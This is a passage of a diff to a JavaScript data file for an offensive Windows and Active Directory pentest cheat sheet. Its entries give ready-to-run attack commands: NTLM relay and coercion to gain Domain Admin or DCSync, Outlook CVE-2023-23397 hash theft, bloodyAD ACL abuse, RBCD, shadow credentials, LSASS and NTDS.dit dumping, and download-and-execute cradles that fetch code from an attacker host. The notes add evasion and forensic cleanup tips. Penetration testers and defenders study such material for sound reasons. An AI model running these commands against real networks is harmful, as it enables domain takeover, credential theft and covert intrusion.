+# Step 2 — Setup NTLM relay on attacker to escalate your user
+ntlmrelayx.py -t ldap://<DC-IP> --escalate-user <your-domain-user>
+# This will: add your user to Enterprise Admins + grant DCSync rights
+
+# Step 3a — Trigger (Windows 10 < 1809 — direct)
+.\RemotePotato0.exe -m 0 -r <attacker-IP> -p 9999
+
+# Step 3b — Trigger (Windows 10 1809+ — needs OXID port forward on separate machine)
+# On a separate machine (socat forwarder):
+socat tcp-listen:135,reuseaddr,fork tcp:<target-IP>:9999
+
+# On target:
+.\RemotePotato0.exe -m 0 -r <attacker-IP> -x <socat-forwarder-IP> -p 9999
+
+# Step 4 — After successful relay, verify your escalated rights
+net group "Enterprise Admins" /domain        # your user should appear
+
+# Step 5 — DCSync to dump all hashes
+secretsdump.py '<domain>/<your-user>:<pass>@<DC-IP>'`,
+    note: 'RemotePotato0 combines two separate COM vulnerabilities: (1) certain CLSIDs in Session 0 cause the COM server to impersonate the Session 1 user, and (2) marshalled COM objects can specify arbitrary OXID resolver endpoints — triggering NTLM authentication to your fake RPC server. Microsoft reviewed and declined to assign a CVE or patch — every domain running NTLM is permanently affected. The attack requires an active privileged interactive session on the same box, which is common on RDP-heavy environments and Citrix/RDS servers.'
+  },
+  {
+    title: 'Exploit Identification — WES-NG, Watson & Sherlock (Find Unpatched Kernel CVEs)',
+    req: 'systeminfo output from target (for WES-NG) or code execution on target (for Watson/Sherlock)',
+    gets: 'Prioritised list of unpatched local privilege escalation CVEs with direct PoC links — turns a low shell into a kernel exploit path',
+    tags: ['have-foothold','cat-privesc','cat-enum'],
+    cmd: `# ── Step 1: WES-NG (offline, attacker-side — zero detection risk) ─────────────
+# On target — capture system info
+systeminfo > C:\\Temp\\si.txt
+# Transfer si.txt to attacker machine
+
+# On attacker — run WES-NG
+pip install wesng                                   # or: git clone bitsadmin/wesng
+python3 wes.py --update                             # update CVE DB before each engagement
+python3 wes.py si.txt --exploits-only               # only CVEs with known public exploits
+python3 wes.py si.txt --impact "Elevation of Privilege" -o results.csv
+
+# Verify a candidate fix is actually missing (WES-NG false-positives from rollup KBs):
+wmic qfe list | findstr <KB_NUMBER>
+# No output = patch not installed → candidate is real
+
+# ── Step 2: Watson (on-target, .NET — ideal for Server 2016+/Win10+) ──────────
+.\Watson.exe
+# Via C2 execute-assembly (no disk write):
+execute-assembly /tools/Watson.exe
+
+# ── Step 3: Sherlock (on-target PowerShell — best for Win7/2008R2–Win10 1507) ─
+IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/Sherlock.ps1')
+Find-AllVulns
+
+# ── Step 4: winPEAS covers both suggesters + misconfigs in one shot ────────────
+.\winPEASx64.exe
+# Search output for [!] CVE markers; also catches misconfigs, creds, token privs
+
+# ── Common high-value CVEs to look for in results ─────────────────────────────
+# CVE-2021-34527 / CVE-2021-1675  PrintNightmare    → SYSTEM (Spooler, servers/DCs)
+# CVE-2021-36934                  HiveNightmare     → hash dump (any local user)
+# CVE-2020-0796                   SMBGhost          → SYSTEM (Win10 1903/1909 only)
+# CVE-2021-42287 + 42278          noPac             → Domain Admin (any domain user)
+# CVE-2020-1472                   ZeroLogon         → DC takeover (no creds needed)
+# CVE-2023-23397                  Outlook hash      → NTLMv2 hash capture (zero-click)`,
+    note: 'WES-NG is the safest first step — it runs entirely on the attacker machine and requires only a systeminfo paste, generating zero target-side detection. The most common false-positive: a superseding cumulative rollup installs the fix under a different KB number than WES-NG expects. Always confirm with wmic qfe or Get-HotFix before downloading a PoC.'
+  },
+  {
+    title: 'CVE-2023-23397 — Outlook NTLM Hash Theft (Zero-Click Calendar Invite)',
+    req: 'Ability to send a meeting invite/email to victim (internal mail, EWS access, or SMTP); victim running Outlook for Windows (not OWA/Mac/mobile); attacker SMB listener on port 445 reachable from target network',
+    gets: 'Victim\'s NetNTLMv2 hash — crack offline or relay immediately to any host with SMB signing disabled; works even against fully patched hosts if unpatched for March 2023',
+    tags: ['have-username','proto-smb','cat-dump','cat-exploit'],
+    cmd: `# CVE-2023-23397: Outlook processes PidLidReminderFileParameter (MAPI prop 0x8514)
+# when reminder fires — if set to a UNC path, Outlook fetches it → leaks NTLMv2
+
+# ── Step 1: Start listener ────────────────────────────────────────────────────
+# Capture only (crack offline):
+sudo responder -I eth0 -v
+
+# OR relay (needs SMB signing disabled on relay target):
+ntlmrelayx.py -tf no-signing-targets.txt -smb2support
+# Find relay targets first:
+nxc smb <SUBNET>/24 --gen-relay-list no-signing.txt
+
+# ── Step 2: Send malicious calendar invite ────────────────────────────────────
+# Public PoC (uses Exchange EWS):
+python3 CVE-2023-23397.py \
+    --server mail.<domain> \
+    --username <attacker-user>@<domain> \
+    --password '<pass>' \
+    --recipient <victim>@<domain> \
+    --attacker-ip <ATTACKER-IP>
+
+# ── Step 3: Wait for reminder to fire (or set reminder_minutes_before_start=0)
+# Hash arrives in Responder output as:
+# [SMB] NTLMv2-SSP Hash: VICTIM::DOMAIN:...
+
+# ── Step 4: Crack or relay ────────────────────────────────────────────────────
+hashcat -m 5600 ntlmv2.txt /opt/wordlists/rockyou.txt -r rules/best64.rule
+
+# If relayed to a session: secretsdump, lateral movement, etc.`,
+    note: 'The trigger is entirely passive from the victim side — Outlook fires the reminder without any user action. The UNC path is set in the MAPI extended property PidLidReminderFileParameter. Outlook on Mac, iOS, Android, and OWA do not process this MAPI property and are not affected. Single most effective mitigation: block outbound SMB (TCP 445) at the perimeter firewall.',
+    warn: 'Patched March 2023 (KB5002333 / KB5002279). Check Outlook version first — if already patched the UNC path is sanitised before fetch. Exchange Online environments may have partial mitigation via EOP policies.'
+  },
+  {
+    title: 'Coercer — Multi-Protocol NTLM Authentication Coercion',
+    req: 'Valid low-privilege domain credentials (IPC$ read access); attacker listener (Responder for capture, ntlmrelayx for relay); install: pip3 install coercer',
+    gets: 'Forces target machine (e.g., DC) to authenticate to attacker via NTLM — relay machine account hash to LDAP for RBCD, or to ADCS for DC certificate (ESC8) → DCSync',
+    tags: ['have-username','have-password','proto-smb','proto-network','cat-coerce','cat-relay'],
+    cmd: `# Coercer wraps 20+ RPC coercion methods across MS-RPRN, MS-EFSR, MS-DFSNM,
+# MS-FSRVP, MS-EVEN6, MS-TSCH, WebDAV — tries all, falls back on each failure
+
+# ── Step 0: Discover what's available (scan only — no authentication trigger) ─
+coercer scan -u <user> -p '<pass>' -d <domain> \
+    --target <DC-IP> --listener-ip <ATTACKER-IP>
+
+# ── Option A: Capture hash (crack offline) ────────────────────────────────────
+# Start Responder:
+sudo responder -I eth0 -v -A   # -A = analyse mode (no poisoning, just capture)
+
+# Trigger coercion:
+coercer coerce -u <user> -p '<pass>' -d <domain> \
+    --target <DC-IP> --listener-ip <ATTACKER-IP>
+# Hash: DC01$::CORP:... → hashcat -m 5600 (NTLMv2)
+
+# ── Option B: Relay to LDAP → RBCD (no SMB signing needed on LDAP relay target) ─
+# Start relay (separate terminal):
+ntlmrelayx.py -t ldap://<DC-IP> --delegate-access \
+    --escalate-user <attacker-computer$> -smb2support
+
+# Coerce:
+coercer coerce -u <user> -p '<pass>' -d <domain> \
+    --target <TARGET-HOST-IP> --listener-ip <ATTACKER-IP>
+
+# ── Option C: Relay to ADCS (ESC8) for DC certificate ─────────────────────────
+ntlmrelayx.py -t http://<CA-IP>/certsrv/certfnsh.asp \
+    --adcs --template DomainController -smb2support
+
+coercer coerce -u <user> -p '<pass>' -d <domain> \
+    --target <DC-IP> --listener-ip <ATTACKER-IP>
+# Outputs DC.pfx → certipy auth -pfx DC.pfx -dc-ip <DC-IP> → DC hash → DCSync
+
+# ── Option D: WebDAV coercion (bypasses SMB signing — HTTP relay) ─────────────
+# WebClient service must be running on target (uncommon on DCs, common on workstations)
+coercer coerce -u <user> -p '<pass>' -d <domain> \
+    --target <WORKSTATION-IP> --listener-ip <ATTACKER-IP> --webdav
+# Relay over HTTP → bypass SMB signing enforcement → relay to LDAP
+
+# ── Single protocol ───────────────────────────────────────────────────────────
+coercer coerce ... --filter-protocol-name MS-EFSR    # PetitPotam only
+coercer coerce ... --filter-protocol-name MS-RPRN    # PrinterBug only
+coercer coerce ... --filter-protocol-name MS-DFSNM   # DFSCoerce only`,
+    note: 'Coercer is the evolution of individual tools (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) — it tries every available method in one run. The most reliable combination in 2024–2025 is MS-DFSNM or MS-EVEN6, since MS-RPRN (Spooler) is now disabled on most DCs post-PrintNightmare and MS-EFSR unauthenticated was patched in August 2021 (authenticated still works). WebDAV coercion is the go-to when SMB signing blocks your relay — it tunnels over HTTP port 80.',
+    warn: 'Scan mode (coercer scan) makes RPC connections to enumerate available methods — not entirely silent. Coerce mode triggers actual authentication — generates EventID 4624 (type 3 logon) for the machine account on your listener. Combine with -smb2support on ntlmrelayx to handle modern SMB2 authentication.'
   },
   {
     title: 'WinPEAS — Windows Privilege Escalation Check',
@@ -5695,7 +6636,365 @@ python3 pywsus.py -H <attacker-IP> -p 8530 \\
 # Force client to check for updates immediately
 wuauclt /detectnow /reportnow`,
     note: 'Update execution runs as SYSTEM via Windows Update service. SharpWSUS requires WSUS admin rights or direct SQL Server access. PyWSUS only needs a network MITM position. Default check interval is 22 hours — force with wuauclt or just wait. All approved updates must be signed by Microsoft, so PyWSUS uses a legitimate signed PsExec as the delivery vehicle.'
-  }
+  },
+  // ── BloodyAD ─────────────────────────────────────────────────────────────────
+  {
+    title: 'BloodyAD — Discover Writable Objects & ACL Recon',
+    req: 'Valid domain credentials (any user); bloodyAD installed (pipx install bloodyAD)',
+    gets: 'Full map of every AD object/attribute current user can write; gMSA/LAPS/shadow-cred read rights; BloodHound JSON via LDAP',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `# Install
+pipx install bloodyAD          # or: uv tool install bloodyAD / pip install bloodyAD
+
+# Full writable object map — fastest way to find where you have write access
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' get writable --detail
+
+# Pass-the-hash (NT hash with leading colon)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p :<NThash> get writable --detail
+
+# Kerberos ticket (set KRB5CCNAME first)
+export KRB5CCNAME=/path/to/ticket.ccache
+bloodyAD --host <DC-IP> -d <domain> -u <user> -k get writable --detail
+
+# Certificate / PKINIT auth (LDAPS recommended)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -c key.pem:cert.pem -s get writable --detail
+
+# BloodHound data collection via LDAP (no SharpHound binary needed)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' get bloodhound
+
+# Read a single attribute
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' get object <target> --attr <attr>
+# Useful attributes:
+#   msDS-ManagedPassword         → gMSA password blob
+#   ms-mcs-admpwd                → LAPS v1 plaintext password
+#   msLAPS-EncryptedPassword     → LAPS v2 encrypted password
+#   msDS-KeyCredentialLink       → existing shadow credentials
+
+# Check BadSuccessor vulnerability (CVE-2025-29810)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' msldap badsuccessor_check`,
+    note: 'get writable --detail is the fastest "where do I have write access?" check — run it immediately after gaining credentials, before BloodHound. It hits the DC directly via LDAP and requires no local admin or special permissions. Look for writeable msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), msDS-KeyCredentialLink (shadow creds), member (group add), and nTSecurityDescriptor (DACL).'
+  },
+  {
+    title: 'BloodyAD — GenericAll / WriteDACL / WriteOwner ACL Abuse',
+    req: 'GenericAll, WriteDACL, WriteOwner, or GenericWrite on target AD object (identified via BloodHound or get writable --detail)',
+    gets: 'Full control over target object — reset password, modify any attribute, or grant arbitrary ACEs to any trustee',
+    tags: ['have-username','have-password','proto-ldap','cat-privesc'],
+    cmd: `# Take ownership of an object (WriteOwner edge)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  set owner 'CN=TargetUser,DC=corp,DC=local' '<attacker-samAccountName>'
+
+# Grant yourself GenericAll ACE on target (WriteDACL edge)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add genericAll 'CN=TargetUser,DC=corp,DC=local' '<attacker-samAccountName>'
+
+# Force-reset target password (GenericAll / ForceChangePassword)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  set password '<targetUser>' 'NewP@ssw0rd!'
+
+# Now authenticate as the target
+nxc smb <target-IP> -u '<targetUser>' -p 'NewP@ssw0rd!'
+
+# Read LAPS password after gaining access to a computer object
+bloodyAD --host <DC-IP> -d <domain> -u <targetUser -p 'NewP@ssw0rd!' \\
+  get object '<computer$>' --attr ms-mcs-admpwd
+
+# Cleanup — remove the GenericAll ACE you added (important for OpSec)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  remove genericAll 'CN=TargetUser,DC=corp,DC=local' '<attacker-samAccountName>'`,
+    note: 'After granting yourself GenericAll, prefer shadow credentials over set password — shadow creds give you a TGT without changing the target\'s password, avoiding a lockout notice. Always remove added ACEs after exploitation to reduce forensic footprint. set owner + add genericAll is the two-step path for WriteOwner edges.'
+  },
+  {
+    title: 'BloodyAD — Add to Privileged Group / Grant DCSync',
+    req: 'WriteMember or GenericAll on a target group (for group membership); WriteDACL on domain root NC head (for DCSync grant)',
+    gets: 'Domain Admins / Backup Operators membership, or full DCSync rights → dump all domain NTLM hashes with secretsdump',
+    tags: ['have-username','have-password','proto-ldap','cat-privesc'],
+    cmd: `# Add user to Domain Admins (WriteMember or GenericAll on group)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add groupMember 'CN=Domain Admins,CN=Users,DC=corp,DC=local' '<attacker-user>'
+
+# Add to Backup Operators (can backup SAM/SYSTEM hive remotely)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add groupMember 'CN=Backup Operators,CN=Builtin,DC=corp,DC=local' '<attacker-user>'
+
+# Grant DCSync rights directly on domain root (WriteDACL on NC head)
+# Quieter than adding to DA — no group membership change event
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add dcsync '<attacker-user>'
+
+# Dump all domain hashes
+secretsdump.py '<domain>/<attacker-user>:<pass>@<DC-IP>'
+
+# Cleanup — remove group membership or DCSync rights after use
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  remove groupMember 'CN=Domain Admins,CN=Users,DC=corp,DC=local' '<attacker-user>'`,
+    note: 'Adding to Domain Admins generates EventID 4728 (member added to security-enabled global group) — loud and likely alerted. Prefer add dcsync if you only need hashes — it modifies the domain root DACL (EventID 5136) and avoids a group membership change. Requires WriteDACL on the domain naming context head, not just any OU.'
+  },
+  {
+    title: 'BloodyAD — Shadow Credentials, gMSA & LAPS Reads',
+    req: 'Shadow creds: WriteProperty on msDS-KeyCredentialLink on target. gMSA: member of PrincipalsAllowedToRetrieveManagedPassword. LAPS: ACE allowing ms-mcs-admpwd / msLAPS-EncryptedPassword read',
+    gets: 'TGT + NT hash for target via PKINIT (no password change, no lockout); gMSA or LAPS plaintext passwords for machine accounts',
+    tags: ['have-username','have-password','proto-ldap','cat-dump','cat-privesc'],
+    cmd: `# Shadow Credentials — write KeyCredential + get TGT + NT hash in ONE step
+# Requires: WriteProperty on msDS-KeyCredentialLink on target
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add shadowCredentials '<targetUser>'
+# Output: saves cert to disk + prints NT hash via PKINIT
+
+# Use the obtained NT hash to pass-the-hash
+nxc smb <DC-IP> -u '<targetUser>' -H <NT-hash>
+# Or use the TGT
+export KRB5CCNAME=<targetUser>.ccache
+bloodyAD --host <DC-IP> -d <domain> -u '<targetUser>' -k get writable --detail
+
+# Read gMSA password (requires group membership in allowed readers)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  get object '<gMSA-account$>' --attr msDS-ManagedPassword
+# Decode the blob with gMSADumper.py or nxc ldap -M gmsa
+
+# Read LAPS v1 password (requires read on ms-mcs-admpwd)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  get object '<computer$>' --attr ms-mcs-admpwd
+
+# Read LAPS v2 (Windows LAPS) encrypted password
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  get object '<computer$>' --attr msLAPS-EncryptedPassword`,
+    note: 'Shadow credentials is the quietest credential extraction path — it writes a KeyCredential to the target object then performs PKINIT to exchange it for a TGT and NT hash, all in one command. No password reset means no lockout risk and no changed login password. Generates EventID 5136 (attribute modified: msDS-KeyCredentialLink) — detectable but less obvious than a password reset event.'
+  },
+  {
+    title: 'BloodyAD — RBCD Setup → Impersonate Domain Admin',
+    req: 'Write access to target computer\'s msDS-AllowedToActOnBehalfOfOtherIdentity attribute + a controllable computer or service account (MachineAccountQuota > 0 or existing owned computer)',
+    gets: 'S4U2Proxy TGS as any domain user (including Administrator) to target machine → local admin / lateral movement',
+    tags: ['have-username','have-password','proto-ldap','proto-kerberos','cat-delegation','cat-privesc'],
+    cmd: `# Step 1 — Add a fake computer account (if MachineAccountQuota > 0, default is 10)
+addcomputer.py -computer-name 'FAKE$' -computer-pass 'F@keP4ss!' \\
+  '<domain>/<user>:<pass>@<DC-IP>'
+# Check quota: nxc ldap <DC-IP> -u <user> -p <pass> -M maq
+
+# Step 2 — Configure RBCD: allow FAKE$ to delegate to TARGET$
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add rbcd 'TARGET$' 'FAKE$'
+
+# Step 3 — Request S4U2Proxy TGS impersonating Domain Admin
+getST.py -spn 'cifs/<target-hostname>.<domain>' -impersonate Administrator \\
+  -dc-ip <DC-IP> '<domain>/FAKE$:F@keP4ss!'
+
+# Step 4 — Use the service ticket
+export KRB5CCNAME=Administrator@cifs_<target-hostname>.<domain>.ccache
+secretsdump.py -k -no-pass '<domain>/Administrator@<target-hostname>.<domain>'
+psexec.py    -k -no-pass '<domain>/Administrator@<target-hostname>.<domain>'
+
+# Cleanup — remove the RBCD entry
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  remove rbcd 'TARGET$' 'FAKE$'`,
+    note: 'The key privilege here is write access to msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object — found via get writable --detail. If MachineAccountQuota is 0, use an existing computer account you already control (owned workstation, LAPS-retrieved admin). RBCD works over LDAP and Kerberos only — no SMB write access to target needed.'
+  },
+  {
+    title: 'BloodyAD — Object Attribute Manipulation (UAC / SPN / UPN)',
+    req: 'WriteProperty on the target attribute: userAccountControl (UAC), servicePrincipalName (SPN), or userPrincipalName (UPN)',
+    gets: 'AS-REP roastable target (UAC), Kerberoastable SPN, or ADCS ESC9/10 UPN substitution for certificate-based privilege escalation',
+    tags: ['have-username','have-password','proto-ldap','cat-privesc','cat-adcs'],
+    cmd: `# ── AS-REP Roasting via UAC flag ─────────────────────────────────────────────
+# Set DONT_REQ_PREAUTH → makes target AS-REP roastable
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add uac '<targetUser>' -f DONT_REQ_PREAUTH
+
+# Roast immediately
+GetNPUsers.py '<domain>/<targetUser>' -no-pass -dc-ip <DC-IP>
+hashcat -m 18200 asrep.txt wordlist.txt
+
+# Cleanup
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  remove uac '<targetUser>' -f DONT_REQ_PREAUTH
+
+# ── Targeted Kerberoasting via SPN ────────────────────────────────────────────
+# Add a fake SPN to make the account Kerberoastable
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  set object '<targetUser>' servicePrincipalName -v 'http/fakesvc'
+
+# Request TGS and crack offline
+GetUserSPNs.py '<domain>/<user>:<pass>' -dc-ip <DC-IP> -request -outputfile tgs.txt
+hashcat -m 13100 tgs.txt wordlist.txt
+
+# ── UPN Swap for ADCS ESC9/10 ────────────────────────────────────────────────
+# Remap target UPN to victim (e.g. administrator) — requires WriteProperty on UPN
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  set object '<targetUser>' userPrincipalName -v 'administrator@<domain>'
+
+# Enroll certificate as targetUser — cert will map to administrator
+certipy req -u '<targetUser>@<domain>' -p '<pass>' -dc-ip <DC-IP> \\
+  -target <CA-IP> -template User -ca '<CA-name>'
+
+# Authenticate as administrator using the cert
+certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
+
+# Restore original UPN afterwards
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  set object '<targetUser>' userPrincipalName -v '<targetUser>@<domain>'`,
+    note: 'UAC and SPN manipulation via LDAP are surgical — no SMB side effects and no need for local admin. For ESC9/10, verify WriteProperty on userPrincipalName first using get writable --detail. Always restore the original UPN after the attack — leaving a non-admin account mapped to administrator@domain will break its logins and likely trigger alerts.'
+  },
+  {
+    title: 'BloodyAD — DNS Record Injection & BadSuccessor (CVE-2025-29810)',
+    req: 'DNS injection: CreateChild on the DNS zone (most domain users have this by default). BadSuccessor: CreateChild on any OU (requires unpatched domain — check patch level, vulnerability was fixed May 2025 Patch Tuesday)',
+    gets: 'DNS injection: persistent rogue A record for NTLM relay or credential capture. BadSuccessor: DMSA object inheriting privileges of all admin groups in target OU scope — effective Domain Admin',
+    tags: ['have-username','have-password','proto-ldap','cat-relay','cat-privesc'],
+    cmd: `# ── DNS Record Injection ──────────────────────────────────────────────────────
+# Dump existing DNS records to map the network
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' get dnsDump
+
+# Inject a rogue A record pointing to your machine
+# Most domain users can create DNS records by default (CreateChild on DomainDnsZones)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add dnsRecord <fake-hostname> <attacker-IP>
+
+# Pair with ntlmrelayx for credential capture
+# (DNS injection is persistent — unlike LLMNR/NBT-NS it doesn't need continuous flooding)
+ntlmrelayx.py -t smb://<target-IP> --smb2support
+
+# ── BadSuccessor — CVE-2025-29810 (patched May 2025 Patch Tuesday) ────────────
+# Check if domain is vulnerable first
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  msldap badsuccessor_check
+
+# Exploit: create a DMSA in any OU you have CreateChild on
+# DMSA inherits privileges of ALL groups within the OU scope
+# Target an OU containing privileged groups (Domain Admins, Enterprise Admins, etc.)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p '<pass>' \\
+  add badSuccessor <dmsa-name> -t 'OU=Domain Controllers,DC=corp,DC=local'
+
+# Authenticate as the DMSA (it now has inherited DA rights)
+getTGT.py '<domain>/<dmsa-name>$:<dmsa-pass>' -dc-ip <DC-IP>
+export KRB5CCNAME=<dmsa-name>.ccache
+secretsdump.py -k -no-pass '<domain>/<dmsa-name>$@<DC-IP>'`,
+    warn: 'BadSuccessor (CVE-2025-29810) was patched in May 2025 Patch Tuesday. Verify patch status with msldap badsuccessor_check before attempting — a patched DC will simply reject the DMSA creation. DNS injection does not require elevated rights but the rogue record persists until explicitly removed — clean up after engagement.',
+    note: 'DNS injection via LDAP is low-noise and persistent — unlike LLMNR/NBT-NS poisoning it does not require continuous network flooding and survives reboots. BadSuccessor generates EventID 5137 (new msDS-DelegatedManagedServiceAccount object created) — detectable by any SIEM monitoring object creation. The DMSA inherits superpowers because it is designed to replace legacy service accounts; the vulnerability is that any OU writer can abuse this inheritance chain.'
+  },
+  {
+    title: 'LOLBAS — LSASS Dump via comsvcs.dll (No Extra Tools)',
+    req: 'Local admin on target Windows host; LSASS process ID',
+    gets: 'Full LSASS minidump → parse with pypykatz or secretsdump → NT hashes, Kerberos TGTs, cleartext creds',
+    tags: ['have-localadmin','cat-dump'],
+    cmd: `# Step 1 — get LSASS PID (from any shell)
+tasklist /fi "imagename eq lsass.exe"
+# OR
+Get-Process lsass
+
+# Step 2 — dump via comsvcs.dll MiniDump (LOLBin — no upload needed)
+rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full
+
+# Step 3 — download lsass.dmp to Kali and parse
+pypykatz lsa minidump lsass.dmp
+# OR
+secretsdump.py -sam lsass.dmp LOCAL
+
+# Stealth alternative — nanodump (direct syscalls, EDR-safe)
+nanodump.exe --write C:\\Windows\\Temp\\lsass.dmp`,
+    note: 'comsvcs.dll is signed by Microsoft — the dump itself is the indicator. Always check for EDR before running. nanodump avoids common LSASS access signatures. Dump file is typically 50-150 MB — exfil via SMB or evil-winrm download.',
+    warn: 'Triggers EDR/Defender on most modern systems. Sysmon Event 10 (LSASS access) fires immediately. Use nanodump or HandleKatz in hardened environments.',
+    ref: 'https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/'
+  },
+  {
+    title: 'LOLBAS — NTDS.dit Extraction (ntdsutil / diskshadow / vssadmin)',
+    req: 'Local admin or DA on Domain Controller; NTDS.dit is always locked by the AD DS service',
+    gets: 'NTDS.dit + SYSTEM hive offline → secretsdump → all domain NT hashes, Kerberos keys, password history',
+    tags: ['have-domainadmin','cat-dump'],
+    cmd: `# Method 1 — ntdsutil IFM (cleanest, all-in-one, requires DA/SYSTEM on DC)
+ntdsutil "ac in ntds" "ifm" "cr fu C:\\Windows\\Temp\\ntds_dump" q q
+# Output: ntds_dump\\Active Directory\\ntds.dit + ntds_dump\\registry\\SYSTEM
+secretsdump.py -ntds "C:\\Windows\\Temp\\ntds_dump\\Active Directory\\ntds.dit" \\
+  -system "C:\\Windows\\Temp\\ntds_dump\\registry\\SYSTEM" LOCAL
+
+# Method 2 — vssadmin + copy (most compatible)
+vssadmin create shadow /for=C:
+# Note the shadow copy path (e.g. \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)
+copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit" C:\\Temp\\ntds.dit
+copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM" C:\\Temp\\SYSTEM
+vssadmin delete shadows /shadow=<SHADOW-ID> /quiet  # cleanup
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+# Method 3 — diskshadow script (script-based, avoids interactive mode)
+# Write to C:\\Temp\\shadow.dsh:
+#   set context persistent nowriters
+#   add volume c: alias myalias
+#   create
+#   expose %myalias% z:
+#   exec C:\\Temp\\copy_ntds.cmd
+#   end exec
+diskshadow /s C:\\Temp\\shadow.dsh
+# In copy_ntds.cmd: copy z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit
+
+# Method 4 — esentutl raw copy via VSS
+esentutl /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit
+
+# Parse offline (all methods)
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes`,
+    note: 'ntdsutil IFM is the most reliable — it creates a consistent snapshot and copies both files automatically. Always delete the shadow copy and dump file after exfil. secretsdump outputs: user:rid:lm:nt format — feed NT hashes directly into PTH tools.',
+    warn: 'Ev 7036 / VSS provider logs trigger on shadow copy creation. ntdsutil audit events logged under AD DS operational log. EDR products alert on ntds.dit file access. Prefer wbadmin or diskshadow over vssadmin in mature security environments.',
+    ref: 'https://lolbas-project.github.io/lolbas/Binaries/Ntdsutil/'
+  },
+  {
+    title: 'LOLBAS — File Download Without Extra Tools (certutil / bitsadmin / curl)',
+    req: 'Shell on Windows target with outbound HTTP/HTTPS to attacker-controlled server',
+    gets: 'Arbitrary file downloaded to disk using only Microsoft-signed built-in binaries — no Wget, PowerShell download cradle, or dropped tools needed',
+    tags: ['have-foothold','cat-enum'],
+    cmd: `# certutil (most reliable — works on all Windows versions)
+certutil -urlcache -split -f http://<ATTACKER>:8080/SharpHound.exe C:\\Windows\\Temp\\sh.exe
+certutil -urlcache -split -f http://<ATTACKER>:8080/PowerView.ps1 C:\\Windows\\Temp\\pv.ps1
+# Clear the URL cache entry after download (reduces artifact):
+certutil -urlcache -split -f http://<ATTACKER>:8080/sh.exe delete
+
+# Base64 encode on attacker + decode on target (no network needed — paste delivery)
+# Kali: base64 -w0 SharpHound.exe > sh.b64  (then paste the b64 string into the shell)
+echo <BASE64-STRING> > C:\\Temp\\sh.b64
+certutil -decode C:\\Temp\\sh.b64 C:\\Temp\\sh.exe
+
+# bitsadmin (survives logoff, uses existing proxy settings)
+bitsadmin /transfer j1 /download /priority high http://<ATTACKER>:8080/sh.exe C:\\Temp\\sh.exe
+
+# curl (Windows 10 1803+ — fastest, familiar syntax)
+curl -s -o C:\\Temp\\sh.exe http://<ATTACKER>:8080/SharpHound.exe
+
+# PowerShell (if available)
+(New-Object Net.WebClient).DownloadFile('http://<ATTACKER>:8080/sh.exe','C:\\Temp\\sh.exe')
+IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER>:8080/PowerView.ps1')`,
+    note: 'certutil -urlcache leaves entries in C:\\Users\\<user>\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache — clean up with the delete flag. bitsadmin downloads are visible in Get-BitsTransfer. Use in-memory IEX (PowerShell) when you want zero disk writes for PS scripts.',
+    warn: 'certutil with HTTP URLs is heavily signatured. Microsoft Defender blocks common certutil download patterns. bitsadmin /transfer is monitored by most EDR. In hardened environments, prefer SMB delivery: impacket-smbserver share /opt/tools -smb2support → access as \\\\<ATTACKER>\\share\\tool.exe',
+    ref: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/'
+  },
+  {
+    title: 'LOLBAS — Proxy Execution (regsvr32 / mshta / MSBuild / InstallUtil)',
+    req: 'Shell on Windows target in restricted execution environment (AppLocker, SRP, or constrained PowerShell); payload (.sct, .hta, .csproj, or .NET DLL) staged on attacker HTTP server or disk',
